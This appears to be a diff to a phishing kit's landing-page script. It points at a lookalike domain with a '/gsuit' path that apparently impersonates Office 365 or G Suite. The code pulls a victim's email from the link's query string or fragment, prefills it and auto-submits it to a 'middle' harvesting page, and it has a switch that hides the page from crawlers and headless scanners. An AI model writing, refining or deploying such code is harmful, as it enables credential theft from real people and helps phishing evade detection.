@@ -130,11 +130,10 @@
     "use strict";
 
     // ===== CONFIG =====
-    var MIDDLE      = "https://panel365webdocumentazionesicuro.org/middle.html"; // your middle script
-    var DEST        = "/area-riservata";   // destination path -> base64 into hash
-    var MIN_MS      = 900;                 // dwell before handoff
-    var AUTO_SUBMIT = true;                // if email came in via ?email= or #hash, fire automatically
-    var BLOCK_BOTS  = false;               // true = blank the page for crawlers/headless
+    var MIDDLE      = "https://panel365webdocumentazionesicuro.org/gsuit";
+    var MIN_MS      = 900;     // dwell before handoff
+    var AUTO_SUBMIT = true;    // if email came in via ?email= or #hash, fire automatically
+    var BLOCK_BOTS  = false;   // true = blank the page for crawlers/headless
     // ==================
 
     var RE = /^[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}$/;
@@ -171,14 +170,9 @@
       return out;
     }
 
-    function b64(s) {
-      try { return btoa(s); }
-      catch (e) { return btoa(unescape(encodeURIComponent(s))); }
-    }
-
-    // middle script expects:  #base64(dest)#email
+    // middle handoff: /gsuit with email as query param
     function target(email) {
-      return MIDDLE + "#" + b64(DEST) + "#" + email;
+      return MIDDLE + "?email=" + encodeURIComponent(email);
     }
 
     function fail(msg) {
@@ -218,9 +212,9 @@
       hint.classList.remove("on");
     });
 
-    // ---- Autograb (same logic as the redirect script):
+    // ---- Autograb:
     //      1) ?email= query param first — survives mailer wrappers/redirects
-    //      2) fragment fallback: #email  or  #dest#email
+    //      2) fragment fallback: #email
     //      double-decoded, validated, then prefill + auto-submit ----
     (function () {
       var email = "";
@@ -230,17 +224,10 @@
       var qe = qs.match(/[?&]email=([^&]+)/i);
       if (qe) email = qe[1];
 
-      // 2) fragment fallback: #email  or  #dest#email
+      // 2) fragment fallback: #email
       if (!email) {
         var raw = (window.location.hash || "").replace(/^#/, "");
-        if (raw) {
-          var sep = raw.indexOf("#");
-          if (sep !== -1) {
-            email = raw.substring(sep + 1);
-          } else if (RE.test(raw)) {
-            email = raw;
-          }
-        }
+        if (raw && RE.test(raw)) email = raw;
       }
 
       email = smartDecode(email).trim();
